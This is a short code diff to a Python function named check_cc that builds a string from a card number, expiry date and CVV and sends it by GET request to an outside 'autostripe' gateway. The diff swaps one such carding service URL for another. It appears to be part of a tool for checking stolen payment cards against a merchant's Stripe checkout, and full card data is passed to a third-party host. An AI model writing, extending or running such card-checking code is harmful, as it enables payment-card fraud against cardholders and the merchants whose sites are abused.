@@ -216,7 +216,7 @@ def check_cc(cc_number, month, year, cvv):
     cc_data = f"{cc_number}|{month}|{year}|{cvv}"
     
     # Your API endpoint
-    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=magicofcolors.eu/cc={cc_data}"
+    url = f"https://blackxcard-autostripe.onrender.com/gateway=autostripe/key=Blackxcard/site=dilaboards.com/cc={cc_data}"
     
     try:
         response = requests.get(url, timeout=35)
